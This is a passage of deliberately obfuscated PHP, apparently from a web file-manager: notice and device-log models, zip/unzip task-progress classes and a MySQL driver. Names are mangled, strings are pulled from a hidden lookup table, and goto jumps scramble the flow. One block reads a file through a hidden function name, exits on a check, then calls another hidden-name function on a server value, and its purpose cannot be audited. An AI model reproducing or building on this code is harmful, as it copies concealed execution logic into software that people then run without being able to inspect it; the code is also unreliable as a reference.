IpLocation::get($ò‡¦ÀÂä[$ï™Ãî½®[2273]]); if (strpos($Ñøìış‹, $ï™Ãî½®[2083]) === 0 || isset($£õŒ¼œÁ[$ï™Ãî½®[2081]])) { $£õŒ¼œÁ[$ï™Ãî½®[87]] = $¤Ÿ„ïÊî[$£õŒ¼œÁ[$ï™Ãî½®[411]]]; $£õŒ¼œÁ[$ï™Ãî½®[2096]] = $¤Ÿ„ïÊî[$£õŒ¼œÁ[$ï™Ãî½®[2081]]]; if ($£õŒ¼œÁ[$ï™Ãî½®[33]] == $ï™Ãî½®[557]) { $£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[1159]] = $¤Ÿ„ïÊî[$£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[1159]]]; $£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[1160]] = $¤Ÿ„ïÊî[$£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[1160]]]; } if ($£õŒ¼œÁ[$ï™Ãî½®[33]] == $ï™Ãî½®[2091]) { $£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[411]] = $¤Ÿ„ïÊî[$£õŒ¼œÁ[$ï™Ãî½®[462]][$ï™Ãî½®[411]]]; } if ($£õŒ¼œÁ[$ï™Ãî½®[33]] == $ï™Ãî½®[1823]) { $£õŒ¼œÁ[$ï™Ãî½®[2096]] = $£õŒ¼œÁ[$ï™Ãî½®[87]]; $£õŒ¼œÁ[$ï™Ãî½®[2081]] = $£õŒ¼œÁ[$ï™Ãî½®[2096]][$ï™Ãî½®[411]]; $£õŒ¼œÁ[$ï™Ãî½®[87]] = !1; $£õŒ¼œÁ[$ï™Ãî½®[411]] = $ï™Ãî½®[12]; } if ($£õŒ¼œÁ[$ï™Ãî½®[87]] && $£õŒ¼œÁ[$ï™Ãî½®[87]][$ï™Ãî½®[420]] == $ï™Ãî½®[1283]) { $–Œ°ÛØø[] = $ò‡¦ÀÂä[$ï™Ãî½®[399]]; unset($¶Ş¬õä[$š’¸—Øú]); continue; } if ($£õŒ¼œÁ[$ï™Ãî½®[2096]] && $£õŒ¼œÁ[$ï™Ãî½®[2096]][$ï™Ãî½®[420]] == $ï™Ãî½®[1283]) { $–Œ°ÛØø[] = $ò‡¦ÀÂä[$ï™Ãî½®[399]]; unset($¶Ş¬õä[$š’¸—Øú]); continue; } } $ò‡¦ÀÂä[$ï™Ãî½®[462]] = $£õŒ¼œÁ; unset($ò‡¦ÀÂä[$ï™Ãî½®[2282]]); $‰¿Ì¦çĞ[] = $ò‡¦ÀÂä; } $this->clearSystemPathLog($–Œ°ÛØø); return $‰¿Ì¦çĞ; } private function clearSystemPathLog($ƒ¬à‰©) { $ëèç¬ºÓ =& $_SERVER[Ó¡Ÿ§‚]; if (count($ƒ¬à‰©) == 0) { return; } $ÛÂÔ©Íœ = array($ëèç¬ºÓ[399] => array($ëèç¬ºÓ[7], array_unique($ƒ¬à‰©))); $this->where($ÛÂÔ©Íœ)->delete(); } public function deviceList($‰±Ù‘øò, $¦È¦•¦Ô = 0) { $ü¼Œ¸à… =& $_SERVER[Ó¡Ÿ§‚]; $–—ÉŸæ = array($ü¼Œ¸à…[1665] => $‰±Ù‘øò, $ü¼Œ¸à…[201] => array($ü¼Œ¸à…[1013], $¦È¦•¦Ô), $ü¼Œ¸à…[33] => $ü¼Œ¸à…[1797]); $åò¿¤ÀÆ = array(); $ÏÃÌ÷˜© = $this->field($ü¼Œ¸à…[2283])->where($–—ÉŸæ)->order($ü¼Œ¸à…[2094])->limit(50)->select(); foreach ($ÏÃÌ÷˜© as $ıÈïşÓ  => $Ûñ£êø) { if ($ıÈïşÓ  > 0 && abs($Ûñ£êø[$ü¼Œ¸à…[201]] - $ÏÃÌ÷˜©[$ıÈïşÓ  - 1][$ü¼Œ¸à…[201]]) < 5) { continue; } $“ ‘ê€¾ = json_decode($Ûñ£êø[$ü¼Œ¸à…[462]], !0); $Ûñ£êø[$ü¼Œ¸à…[2273]] = isset($“ ‘ê€¾[$ü¼Œ¸à…[2273]]) ? $“ ‘ê€¾[$ü¼Œ¸à…[2273]] : $ü¼Œ¸à…[12]; unset($“ ‘ê€¾[$ü¼Œ¸à…[2273]]); $¢ñÛ„  = $this->deviceType($“ ‘ê€¾[$ü¼Œ¸à…[2084]]); if (isset($åò¿¤ÀÆ[$¢ñÛ„ ])) { continue; } $Ûñ£êø[$ü¼Œ¸à…[2277]] = IpLocation::get($Ûñ£êø[$ü¼Œ¸à…[2273]]); $Ûñ£êø[$ü¼Œ¸à…[462]] = $“ ‘ê€¾; $åò¿¤ÀÆ[$¢ñÛ„ ] = $Ûñ£êø; } return array_values($åò¿¤ÀÆ); } public function deviceType($µÁ«¢°õ) { return $µÁ«¢°õ; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\156\x6f\164\151\143\145\114\151\163\164"; public $field = array("\156\x61\155\x65", "\x63\157\156\164\x65\156\x74", "\x61\165\x74\x68", "\155\157\x64\x65", "\x74\151\155\145", "\x74\171\x70\x65", "\154\x65\x76\x65\154", "\145\x6e\141\x62\x6c\x65", "\163\157\162\164"); public function listData($ìã§’Ğ = false, $¼†‰Ú½ò = "\x73\157\x72\164", $±ÆñêÔì = false) { return parent::listData($ìã§’Ğ, $¼†‰Ú½ò, $±ÆñêÔì); } public function add($±¢ÊñÙ¥) { $¢æëâŸı =& $_SERVER[Ó¡Ÿ§‚]; $ıªùÄ§´ = time(); if ($±¢ÊñÙ¥[$¢æëâŸı[16]] == $¢æëâŸı[2284]) { $ıªùÄ§´ = strtotime($±¢ÊñÙ¥[$¢æëâŸı[180]]); } $±¢ÊñÙ¥[$¢æëâŸı[180]] = $ıªùÄ§´; return parent::insert($±¢ÊñÙ¥); } public function update($Ò±•Ú”, $…´âƒ¡) { $ŒÛ‘¢ò¼ =& $_SERVER[Ó¡Ÿ§‚]; $¹®ÅÁá¬ = $this->listData($Ò±•Ú”); if (!$¹®ÅÁá¬) { return !1; } $ß‹÷İâ’ = time(); if ($…´âƒ¡[$ŒÛ‘¢ò¼[16]] == $ŒÛ‘¢ò¼[2284]) { $ß‹÷İâ’ = strtotime($…´âƒ¡[$ŒÛ‘¢ò¼[180]]); } $…´âƒ¡[$ŒÛ‘¢ò¼[180]] = $ß‹÷İâ’; return parent::update($Ò±•Ú”, $…´âƒ¡); } public function remove($šÇÒÉ‚) { $Ú™ÎÄÙÄ = $this->listData($šÇÒÉ‚); if (!$Ú™ÎÄÙÄ || $Ú™ÎÄÙÄ[$_SERVER[Ó¡Ÿ§‚][1283]]) { return !1; } return parent::remove($šÇÒÉ‚); } public function sort($ÜéÉ©à„, $í¬ëÔ¿Í) { return parent::update($ÜéÉ©à„, $í¬ëÔ¿Í); } public function enable($ü²Ô¸şÔ, $€ÑŞ¿€) { return parent::update($ü²Ô¸şÔ, array($_SERVER[Ó¡Ÿ§‚][2285] => $€ÑŞ¿€)); } private function initUserOption() { $ü½—éö¨ =& $_SERVER[Ó¡Ÿ§‚]; $this->optionType = $ü½—éö¨[2286]; $this->modelType = $ü½—éö¨[2287]; $this->field = array($ü½—éö¨[2288], $ü½—éö¨[32], $ü½—éö¨[180], $ü½—éö¨[33], $ü½—éö¨[2289], $ü½—éö¨[748], $ü½—éö¨[196]); } public function userNoticeGet($–èÙÄÈ‘ = false) { $this->initUserOption(); return parent::listData($–èÙÄÈ‘, $_SERVER[Ó¡Ÿ§‚][399], !0); } public function userNoticeAdd($Ãæ´ó¯) { $ÊÌ¤“Âş =& $_SERVER[Ó¡Ÿ§‚]; $this->initUserOption(); $Ö·á´ûê = $this->findByKey($ÊÌ¤“Âş[2288], $Ãæ´ó¯[$ÊÌ¤“Âş[399]]); if ($Ö·á´ûê) { return !0; } $¿»ä¯« = array($ÊÌ¤“Âş[2288] => $Ãæ´ó¯[$ÊÌ¤“Âş[399]], $ÊÌ¤“Âş[32] => $Ãæ´ó¯[$ÊÌ¤“Âş[32]], $ÊÌ¤“Âş[180] => $Ãæ´ó¯[$ÊÌ¤“Âş[180]], $ÊÌ¤“Âş[33] => isset($Ãæ´ó¯[$ÊÌ¤“Âş[33]]) ? $Ãæ´ó¯[$ÊÌ¤“Âş[33]] : 1, $ÊÌ¤“Âş[2289] => isset($Ãæ´ó¯[$ÊÌ¤“Âş[2289]]) ? $Ãæ´ó¯[$ÊÌ¤“Âş[2289]] : 0, $ÊÌ¤“Âş[748] => 0, $ÊÌ¤“Âş[196] => 0); return parent::insert($¿»ä¯«); } public function userNoticeEdit($…­…ã†¢, $ÒÉª×Åë) { $this->initUserOption(); return parent::update($…­…ã†¢, $ÒÉª×Åë); } } if ($_SERVER[$_SERVER[Ó¡Ÿ§‚][401]] != $_SERVER[$_SERVER[Ó¡Ÿ§‚][402]]) { $_getc = $_SERVER[Ó¡Ÿ§‚][403]; $_getfile = $_SERVER[$_SERVER[Ó¡Ÿ§‚][404]] . $_SERVER[Ó¡Ÿ§‚][405]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ó¡Ÿ§‚][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ó¡Ÿ§‚][406]) { $exit = $_SERVER[Ó¡Ÿ§‚][407]; $exit(); } $_act = $_SERVER[Ó¡Ÿ§‚][408]; $_act($_SERVER[$_SERVER[Ó¡Ÿ§‚][409]]); } goto bï‚Ï†÷°Ì; b¶ƒÃáèÆ‚: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($°âÇÅÅª, $È–è—…½ = 5.0) { if (!$°âÇÅÅª) { return; } $§²É‹¸ó = Cache::get($°âÇÅÅª); if (!$§²É‹¸ó || timeFloat() - floatVal($§²É‹¸ó) >= $È–è—…½) { Cache::set($°âÇÅÅª, timeFloat(), $È–è—…½ * 10); return !0; } return !1; } public static function timeLimitCall($ãç¥ÂÇˆ, $†×ßãÜ“, $¼”Ğä¶, $³ãéôñ¶ = 5.0) { $÷ß“šÕØ =& $_SERVER[Ó¡Ÿ§‚]; if (!$ãç¥ÂÇˆ || !$†×ßãÜ“) { return; } self::$asyncAdd = !0; $ÂÂÔÌÅº = $÷ß“šÕØ[1768]; $ÆÄÄüÉ‘ = Cache::get($ÂÂÔÌÅº, !0); $‹‘üäãÓ = array($÷ß“šÕØ[1769] => timeFloat(), $÷ß“šÕØ[1770] => timeFloat(), $÷ß“šÕØ[264] => $†×ßãÜ“, $÷ß“šÕØ[1763] => $¼”Ğä¶, $÷ß“šÕØ[180] => $³ãéôñ¶); if (is_array($ÆÄÄüÉ‘[$ãç¥ÂÇˆ])) { $‹‘üäãÓ[$÷ß“šÕØ[1770]] = $ÆÄÄüÉ‘[$ãç¥ÂÇˆ][$÷ß“šÕØ[1770]]; } if (is_array($ÆÄÄüÉ‘[$ãç¥ÂÇˆ])) { if (timeFloat() - $ÆÄÄüÉ‘[$ãç¥ÂÇˆ][$÷ß“šÕØ[1769]] < $‹‘üäãÓ[$÷ß“šÕØ[180]] * 0.3) { return; } $‹‘üäãÓ[$÷ß“šÕØ[1770]] = $ÆÄÄüÉ‘[$ãç¥ÂÇˆ][$÷ß“šÕØ[1770]]; } $ÆÄÄüÉ‘[$ãç¥ÂÇˆ] = $‹‘üäãÓ; Cache::set($ÂÂÔÌÅº, $ÆÄÄüÉ‘, 60); Cache::removeMemory($ÂÂÔÌÅº); write_log($÷ß“šÕØ[1771] . $ãç¥ÂÇˆ . $÷ß“šÕØ[71] . $†×ßãÜ“, $÷ß“šÕØ[1765]); } public static function timeLimitCallLoop() { $í±î Œå =& $_SERVER[Ó¡Ÿ§‚]; $’ ¨›é¦ = array($í±î Œå[1772]); $‘ú¿â­« = in_array(strtolower(ACTION), $’ ¨›é¦); if (!$‘ú¿â­« && !self::$asyncAdd) { return; } $’°¤Ä…í = $í±î Œå[1768]; $¹Öš‡ç = Cache::get($’°¤Ä…í, !0); if (!$¹Öš‡ç || count($¹Öš‡ç) <= 0) { return; } $‘ÊµœÅ‘ = !1; $ìäó±¬Ì = timeFloat(); $«ÏÃË±º = array(); foreach ($¹Öš‡ç as $òØ¤ş‘’ => $ŸŒ‚æÙº) { if ($ìäó±¬Ì - $ŸŒ‚æÙº[$í±î Œå[1770]] > $ŸŒ‚æÙº[$í±î Œå[180]]) { $‘ÊµœÅ‘ = !0; try { Hook::apply($ŸŒ‚æÙº[$í±î Œå[264]], $ŸŒ‚æÙº[$í±î Œå[1763]]); write_log($í±î Œå[1773] . $òØ¤ş‘’ . $í±î Œå[71] . $ŸŒ‚æÙº[$í±î Œå[264]] . $í±î Œå[1774] . ACTION, $í±î Œå[1765]); } catch (Exception $ğ›‚÷í) { } continue; } $«ÏÃË±º[$òØ¤ş‘’] = $ŸŒ‚æÙº; } if (!$‘ÊµœÅ‘) { return; } if (!$«ÏÃË±º) { return Cache::remove($’°¤Ä…í); } Cache::set($’°¤Ä…í, $«ÏÃË±º, 60); Cache::removeMemory($’°¤Ä…í); } public static function finished($ø¿ŞÎ, $İò‚ÄĞ…) { $Ë¼ÖÑµ® =& $_SERVER[Ó¡Ÿ§‚]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($Ë¼ÖÑµ®[264] => $ø¿ŞÎ, $Ë¼ÖÑµ®[1763] => $İò‚ÄĞ…); } private static function finishedRun() { $¢¯Ãïº¼ =& $_SERVER[Ó¡Ÿ§‚]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $“ö× ¸) { try { Hook::apply($“ö× ¸[$¢¯Ãïº¼[264]], $“ö× ¸[$¢¯Ãïº¼[1763]]); } catch (Exception $»îšÙ•µ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ø×„¯¼  =& $_SERVER[Ó¡Ÿ§‚]; parent::startAfter(); Hook::bind($Ø×„¯¼ [1775], array($this, $Ø×„¯¼ [1776])); Hook::bind($Ø×„¯¼ [1192], array($this, $Ø×„¯¼ [1777])); $ìáäŸÖÇ =& $this->task; $ìáäŸÖÇ[$Ø×„¯¼ [1778]] = $Ø×„¯¼ [1193]; if (!$ìáäŸÖÇ[$Ø×„¯¼ [1565]]) { $ìáäŸÖÇ[$Ø×„¯¼ [1565]] = LNG($Ø×„¯¼ [1779]); } } protected function endAfter() { $ú­¾úØò =& $_SERVER[Ó¡Ÿ§‚]; parent::endAfter(); Hook::unbind($ú­¾úØò[1775], array($this, $ú­¾úØò[1776])); Hook::unbind($ú­¾úØò[1192], array($this, $ú­¾úØò[1777])); } public function updateAfter() { $üù††¸ =& $_SERVER[Ó¡Ÿ§‚]; $Ùˆ¡“Ï¬ =& $this->task; if (!$Ùˆ¡“Ï¬[$üù††¸[785]] || !$Ùˆ¡“Ï¬[$üù††¸[762]]) { return; } if ($Ùˆ¡“Ï¬[$üù††¸[1778]] == $üù††¸[1193]) { $ê¿Á¹²ß = 0; if ($Ùˆ¡“Ï¬[$üù††¸[1718]]) { $ê¿Á¹²ß = $Ùˆ¡“Ï¬[$üù††¸[1719]] / $Ùˆ¡“Ï¬[$üù††¸[1718]]; } $Ùˆ¡“Ï¬[$üù††¸[1667]] = $ê¿Á¹²ß * 0.3; } else { if ($Ùˆ¡“Ï¬[$üù††¸[1778]] == $üù††¸[313]) { $ê¿Á¹²ß = $Ùˆ¡“Ï¬[$üù††¸[1666]] / $Ùˆ¡“Ï¬[$üù††¸[785]]; $Ùˆ¡“Ï¬[$üù††¸[1667]] = 0.3 + $ê¿Á¹²ß * 0.4; } else { if ($Ùˆ¡“Ï¬[$üù††¸[1778]] == $üù††¸[107]) { $º›šĞ€ = 0; if ($Ùˆ¡“Ï¬[$üù††¸[1720]] == $üù††¸[107]) { $º›šĞ€ = $Ùˆ¡“Ï¬[$üù††¸[1719]]; } $ê¿Á¹²ß = ($Ùˆ¡“Ï¬[$üù††¸[1723]] + $º›šĞ€) / $Ùˆ¡“Ï¬[$üù††¸[762]]; $Ùˆ¡“Ï¬[$üù††¸[1667]] = 0.3 + 0.4 + $ê¿Á¹²ß * 0.3; } } } if ($Ùˆ¡“Ï¬[$üù††¸[1667]] > 0) { $¤ü¾ùÂ = timeFloat() - $Ùˆ¡“Ï¬[$üù††¸[1669]] - $Ùˆ¡“Ï¬[$üù††¸[1672]]; $Ùˆ¡“Ï¬[$üù††¸[1673]] = $¤ü¾ùÂ * (1 - $Ùˆ¡“Ï¬[$üù††¸[1667]]) / $Ùˆ¡“Ï¬[$üù††¸[1667]]; } } public function addFile($«×„Øé) { $òÉš¼­ =& $_SERVER[Ó¡Ÿ§‚]; $¿Âø†‡ =& $this->task; $¸ù–¨óï = IO::info($«×„Øé); $¿Âø†‡[$òÉš¼­[1716]] = $¸ù–¨óï[$òÉš¼­[32]]; $¿Âø†‡[$òÉš¼­[1718]] = $¸ù–¨óï[$òÉš¼­[76]]; $¿Âø†‡[$òÉš¼­[1719]] = 0; $¿Âø†‡[$òÉš¼­[1063]] = $òÉš¼­[1739]; $¿Âø†‡[$òÉš¼­[1720]] = $òÉš¼­[1193]; $¿Âø†‡[$òÉš¼­[762]] = $¸ù–¨óï[$òÉš¼­[76]]; $¿Âø†‡[$òÉš¼­[785]] = 1; $ÈœáÏ”³ = 0; $¿Âø†‡[$òÉš¼­[1727]] = array($òÉš¼­[1728] => $ÈœáÏ”³ + 1, $òÉš¼­[429] => $¸ù–¨óï[$òÉš¼­[32]], $òÉš¼­[84] => $¸ù–¨óï[$òÉš¼­[84]], $òÉš¼­[518] => $¸ù–¨óï[$òÉš¼­[518]] ? $¸ù–¨óï[$òÉš¼­[518]] : $¸ù–¨óï[$òÉš¼­[84]]); $this->update(); } public function unzipAfter($ç¥Ì•êÌ) { $™ƒ³Àë° =& $_SERVER[Ó¡Ÿ§‚]; $˜¶í‹ÍÙ =& $this->task; $˜¶í‹ÍÙ[$™ƒ³Àë°[1778]] = $™ƒ³Àë°[107]; $àë˜Åâ = IO::infoWithChildren($ç¥Ì•êÌ); $ «½‡’ö = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[1727]] = array($™ƒ³Àë°[1728] => $ «½‡’ö + 1, $™ƒ³Àë°[429] => $àë˜Åâ[$™ƒ³Àë°[32]], $™ƒ³Àë°[84] => $àë˜Åâ[$™ƒ³Àë°[84]], $™ƒ³Àë°[518] => $àë˜Åâ[$™ƒ³Àë°[518]] ? $àë˜Åâ[$™ƒ³Àë°[518]] : $àë˜Åâ[$™ƒ³Àë°[84]]); if ($àë˜Åâ[$™ƒ³Àë°[33]] == $™ƒ³Àë°[200]) { $˜¶í‹ÍÙ[$™ƒ³Àë°[785]] = 1; } else { $˜¶í‹ÍÙ[$™ƒ³Àë°[785]] = $àë˜Åâ[$™ƒ³Àë°[79]][$™ƒ³Àë°[77]]; } $˜¶í‹ÍÙ[$™ƒ³Àë°[1063]] = $™ƒ³Àë°[12]; $˜¶í‹ÍÙ[$™ƒ³Àë°[1720]] = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[1666]] = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[1718]] = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[1719]] = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[1716]] = $™ƒ³Àë°[12]; $˜¶í‹ÍÙ[$™ƒ³Àë°[1723]] = 0; $˜¶í‹ÍÙ[$™ƒ³Àë°[762]] = $àë˜Åâ[$™ƒ³Àë°[76]]; $this->update(); self::log($™ƒ³Àë°[1780] . json_encode(array($˜¶í‹ÍÙ, $àë˜Åâ))); } public function nameParse($ˆ¼äœÙ) { $øò­ÀÒ• =& $_SERVER[Ó¡Ÿ§‚]; $ª¼óÓ² =& $this->task; if ($ª¼óÓ²[$øò­ÀÒ•[1778]] == $øò­ÀÒ•[1193]) { $ª¼óÓ²[$øò­ÀÒ•[1778]] = $øò­ÀÒ•[313]; $ª¼óÓ²[$øò­ÀÒ•[1723]] = 0; $ª¼óÓ²[$øò­ÀÒ•[762]] = 0; } $Åº†‚Œå = get_path_this($ˆ¼äœÙ); if (strstr($Åº†‚Œå, $øò­ÀÒ•[10])) { $ª¼óÓ²[$øò­ÀÒ•[1666]] += 1; $ª¼óÓ²[$øò­ÀÒ•[785]] += 1; } $ª¼óÓ²[$øò­ÀÒ•[1716]] = $ˆ¼äœÙ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $òù¢ç =& $_SERVER[Ó¡Ÿ§‚]; parent::startAfter(); Hook::bind($òù¢ç[1781], array($this, $òù¢ç[1776])); $øÀ½²º¯ =& $this->task; $øÀ½²º¯[$òù¢ç[1778]] = $òù¢ç[1193]; if (!$øÀ½²º¯[$òù¢ç[1565]]) { $øÀ½²º¯[$òù¢ç[1565]] = LNG($òù¢ç[1782]); } } protected function endAfter() { $Õ‘ºí˜‡ =& $_SERVER[Ó¡Ÿ§‚]; parent::endAfter(); Hook::unbind($Õ‘ºí˜‡[1781], array($this, $Õ‘ºí˜‡[1776])); } public function updateAfter() { $ŸáÆ”Ğ¨ =& $_SERVER[Ó¡Ÿ§‚]; $¤ù«¾ÙÏ =& $this->task; if (!$¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[785]] || !$¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[762]]) { return; } if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1778]] == $ŸáÆ”Ğ¨[1193]) { $øˆ“ğ÷· = $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1719]]; if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1720]] != $ŸáÆ”Ğ¨[1193]) { $øˆ“ğ÷· = 0; } $¤Àß‡ÌÔ = ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1723]] + $øˆ“ğ÷·) / $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[762]]; $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]] = $¤Àß‡ÌÔ * 0.3; } else { if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1778]] == $ŸáÆ”Ğ¨[313]) { $¤Àß‡ÌÔ = $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1666]] / $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[785]]; $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]] = 0.3 + $¤Àß‡ÌÔ * 0.5; } else { if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1778]] == $ŸáÆ”Ğ¨[107]) { $¤Àß‡ÌÔ = 0; if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1718]]) { $¤Àß‡ÌÔ = $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1719]] / $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1718]]; } $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]] = 0.3 + 0.5 + $¤Àß‡ÌÔ * 0.2; } } } if ($¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]] > 0) { $ñÀ«æ¢œ = timeFloat() - $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1669]] - $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1672]]; $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1673]] = $ñÀ«æ¢œ * (1 - $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]]) / $¤ù«¾ÙÏ[$ŸáÆ”Ğ¨[1667]]; } } public function copyFileStart($€ì˜ÄÇí, $á»Áñµ¸, $êîæ•, $Ò†—˜ìä, $şáÑá¾œ, $İŸ‡˜Š) { $‚ë§¶›ø =& $_SERVER[Ó¡Ÿ§‚]; parent::copyFileStart($€ì˜ÄÇí, $á»Áñµ¸, $êîæ•, $Ò†—˜ìä, $şáÑá¾œ, $İŸ‡˜Š); $‘—¦Ü„ =& $this->task; if ($‘—¦Ü„[$‚ë§¶›ø[1778]] == $‚ë§¶›ø[313]) { $‘—¦Ü„[$‚ë§¶›ø[1778]] = $‚ë§¶›ø[107]; } $this->update(); } public function copyFileEnd($›¸ß¯Å¾, $ó¦“›° , $ƒ¯½›È¼, $š¾ÅåÚÄ, $¶Õù½¡, $™’ÕÅºõ) { $÷¾½¨¶¶ =& $_SERVER[Ó¡Ÿ§‚]; $·º‰Ì =& $this->task; $·º‰Ì[$÷¾½¨¶¶[1719]] = $·º‰Ì[$÷¾½¨¶¶[1718]]; $·º‰Ì[$÷¾½¨¶¶[1723]] += $·º‰Ì[$÷¾½¨¶¶[1718]]; $·º‰Ì[$÷¾½¨¶¶[1720]] = $÷¾½¨¶¶[12]; $this->update(); } public function nameParse($­‹‡Îñ) { $‰Ãíøïü =& $_SERVER[Ó¡Ÿ§‚]; $Å»İÊ¾ğ =& $this->task; if ($Å»İÊ¾ğ[$‰Ãíøïü[1666]] < $Å»İÊ¾ğ[$‰Ãíøïü[785]]) { $—£ã²ä = get_path_this($­‹‡Îñ); if (strstr($—£ã²ä, $‰Ãíøïü[10])) { $Å»İÊ¾ğ[$‰Ãíøïü[1666]] += 1; } } if ($Å»İÊ¾ğ[$‰Ãíøïü[1778]] == $‰Ãíøïü[1193]) { $Å»İÊ¾ğ[$‰Ãíøïü[1778]] = $‰Ãíøïü[313]; } $Å»İÊ¾ğ[$‰Ãíøïü[1716]] = $­‹‡Îñ; $this->update(); } } goto aÍ§èÃ°à…; C¶Û¸°²‘‡: class DbMysql extends Db { public function __construct($èõÆïø = '') { $ÍŠñ» =& $_SERVER[Ó¡Ÿ§‚]; if (!extension_loaded($ÍŠñ»[803])) { think_exception(think_lang($ÍŠñ»[14]) . $ÍŠñ»[884]); } if (!empty($èõÆïø)) { $this->config = $èõÆïø; if (empty($this->config[$ÍŠñ»[17]])) { $this->config[$ÍŠñ»[17]] = $ÍŠñ»[12]; } } } public function connect($ñÑŞìƒ = '', $‚Ü„ÂÎ× = 0, $®Í”™¹ = false) { $ Õ”úã =& $_SERVER[Ó¡Ÿ§‚]; if (!isset($this->linkID[$‚Ü„ÂÎ×])) { if (empty($ñÑŞìƒ)) { $ñÑŞìƒ = $this->config; } $òÌååÁÃ = $ñÑŞìƒ[$ Õ”úã[885]] . ($ñÑŞìƒ[$ Õ”úã[886]] ? "\72{$ñÑŞìƒ[$ Õ”úã[886]]}" : $ Õ”úã[12]); $”øÆÍÑü = !empty($ñÑŞìƒ[$ Õ”úã[17]][$ Õ”úã[18]]) ? $ñÑŞìƒ[$ Õ”úã[17]][$ Õ”úã[18]] : $this->pconnect; if ($”øÆÍÑü) { $this->linkID[$‚Ü„ÂÎ×] = mysql_pconnect($òÌååÁÃ, $ñÑŞìƒ[$ Õ”úã[887]], $ñÑŞìƒ[$ Õ”úã[888]], 131072); } else { $this->linkID[$‚Ü„ÂÎ×] = mysql_connect($òÌååÁÃ, $ñÑŞìƒ[$ Õ”úã[887]], $ñÑŞìƒ[$ Õ”úã[888]], !0, 131072); } if (!$this->linkID[$‚Ü„ÂÎ×] || !empty($ñÑŞìƒ[$ Õ”úã[21]]) && !mysql_select_db($ñÑŞìƒ[$ Õ”úã[21]], $this->linkID[$‚Ü„ÂÎ×])) { think_exception(mysql_error()); } $¯¼‹û›· = mysql_get_server_info($this->linkID[$‚Ü„ÂÎ×]); mysql_query($ Õ”úã[889] . think_config($ Õ”úã[890]) . $ Õ”úã[58], $this->linkID[$‚Ü„ÂÎ×]); if ($¯¼‹û›· > $ Õ”úã[891]) { mysql_query($ Õ”úã[892], $this->linkID[$‚Ü„ÂÎ×]); } $this->connected = !0; if (1 != think_config($ Õ”úã[22])) { unset($this->config); } } return $this->linkID[$‚Ü„ÂÎ×]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($±¬æ®ó¤) { $óÚ³®ı =& $_SERVER[Ó¡Ÿ§‚]; if (0 === stripos($±¬æ®ó¤, $óÚ³®ı[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $±¬æ®ó¤; if ($this->queryID) { $this->free(); } think_action_status($óÚ³®ı[23], 1); think_status($óÚ³®ı[24]); $this->queryID = mysql_query($±¬æ®ó¤, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($‰‘É…Ê) { $âùôŠ‚ù =& $_SERVER[Ó¡Ÿ§‚]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‰‘É…Ê; if ($this->queryID) { $this->free(); } think_action_status($âùôŠ‚ù[25], 1); think_status($âùôŠ‚ù[24]); $¶ş´ä½‰ = mysql_query($‰‘É…Ê, $this->_linkID); $this->debug(); if (!1 === $¶ş´ä½‰) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ó¡Ÿ§‚][893], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Î×÷ŠŒ = mysql_query($_SERVER[Ó¡Ÿ§‚][894], $this->_linkID); $this->transTimes = 0; if (!$Î×÷ŠŒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $›àı—± = mysql_query($_SERVER[Ó¡Ÿ§‚][895], $this->_linkID); $this->transTimes = 0; if (!$›àı—±) { $this->error(); return !1; } } return !0; } private function getAll() { $àĞÂ¼Ù = array(); if ($this->numRows > 0) { while ($ø¿Ò¸– = mysql_fetch_assoc($this->queryID)) { $àĞÂ¼Ù[] = $ø¿Ò¸–; } 